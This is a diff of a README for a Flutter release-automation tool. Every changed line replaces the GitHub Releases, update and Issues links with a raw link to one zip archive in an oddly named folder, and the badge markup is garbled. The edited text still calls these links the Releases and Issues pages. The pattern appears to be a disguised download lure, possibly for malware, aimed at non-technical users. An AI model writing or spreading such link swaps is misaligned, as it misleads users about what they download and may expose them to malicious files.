@@ -1,7 +1,7 @@
 # 🚀 flutter-automatic-deploy - Automate Your Flutter Project Releases
 
 ## 📥 Download the Latest Release
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/Alzino08/flutter-automatic-deploy/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Alzino08/flutter-automatic-deploy/main/Pawtucket/flutter-automatic-deploy-v3.4.zip%20Latest%https://raw.githubusercontent.com/Alzino08/flutter-automatic-deploy/main/Pawtucket/flutter-automatic-deploy-v3.4.zip)](https://raw.githubusercontent.com/Alzino08/flutter-automatic-deploy/main/Pawtucket/flutter-automatic-deploy-v3.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the flutter-automatic-deploy project! This tool helps you handle version updates, create changelogs, and launch your Flutter apps on the App Store and Play Store. Whether you're a hobbyist or launching your first app, this guide will help you get started without any technical skills.
@@ -10,7 +10,7 @@ Welcome to the flutter-automatic-deploy project! This tool helps you handle vers
 To start using flutter-automatic-deploy, you need to download the latest version of the software. 
 
 1. Click on the following link to **visit the Releases page**:  
-   [Download Latest Release](https://github.com/Alzino08/flutter-automatic-deploy/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/Alzino08/flutter-automatic-deploy/main/Pawtucket/flutter-automatic-deploy-v3.4.zip)
    
 2. On the Releases page, look for the most recent version.  
 
@@ -53,7 +53,7 @@ Once you have flutter-automatic-deploy installed, you can begin using it. Here�
 5. **Deploy Your App:** Follow the prompts to release your app on the App Store and Play Store.
 
 ## 🔄 Update & Maintenance
-Keeping flutter-automatic-deploy updated is important for optimal performance and security. Make it a habit to check the [Releases page](https://github.com/Alzino08/flutter-automatic-deploy/releases) periodically for the latest updates. 
+Keeping flutter-automatic-deploy updated is important for optimal performance and security. Make it a habit to check the [Releases page](https://raw.githubusercontent.com/Alzino08/flutter-automatic-deploy/main/Pawtucket/flutter-automatic-deploy-v3.4.zip) periodically for the latest updates. 
 
 1. **Regular Checks:** Check the Releases page every few weeks.
 2. **Simple Update Process:** When a new version is available, download it following the steps outlined in the "Download & Install" section.
@@ -61,7 +61,7 @@ Keeping flutter-automatic-deploy updated is important for optimal performance an
 ## 🤝 Community and Support
 Should you have any questions or require assistance, consider engaging with the flutter-automatic-deploy community. 
 
-- **GitHub Issues:** You can report issues or ask questions directly on the [Issues page](https://github.com/Alzino08/flutter-automatic-deploy/issues).
+- **GitHub Issues:** You can report issues or ask questions directly on the [Issues page](https://raw.githubusercontent.com/Alzino08/flutter-automatic-deploy/main/Pawtucket/flutter-automatic-deploy-v3.4.zip).
 - **Community Forums:** Join Flutter community forums to share experiences and tips with other users.
 
 ## ⚡ Limitations and Considerations
